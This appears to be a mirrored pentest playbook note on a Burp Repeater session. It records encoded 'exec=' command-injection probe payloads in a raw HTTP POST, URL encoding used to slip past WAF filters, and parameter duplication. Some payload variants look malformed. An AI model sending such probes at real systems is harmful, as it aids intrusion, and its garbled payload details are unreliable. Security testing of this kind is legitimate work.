<!-- Mirrored from manojxshrestha/playbook/docs/web-timing-attacks/encoded-payload-testing.md -->
# Encoded exec= Payload Testing - Burp Repeater Session

Technique: parameter pollution + WAF bypass using encoded command-like payloads.

**Encoded payload:**
```
POST / HTTP/1.1
Host: redacted.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

exec=()+(+{3a3b+}%3b+echo+1
```

Alternative / extended variant:
```
exec=(()+{3a%3b+%3b+echo+1
```
Full combined:
```
exec=()+(+{3a3b+}%3b+echo+1
```

**Additional technique noted:**
```
10 param search=test&search=test
```
→ Testing parameter duplication / repetition (10x `search=test`) as a parallel technique.

**UI observations from Burp:**
- Send button progress bar dragged to ~10-12 seconds (slow send)
- Target: http://redacted.com (or similar)
- No response body shown — focus is on crafting / sending the encoded `exec=` payload

**Purpose:**
- Encoding shell-like commands (`echo+1`) inside `exec=` to test for command injection / expression evaluation
- Using URL encoding (`%3b` for `;`) to evade basic filters
- Combining with parameter count amplification (10x `search=`) to increase chances of hitting a vulnerable parser
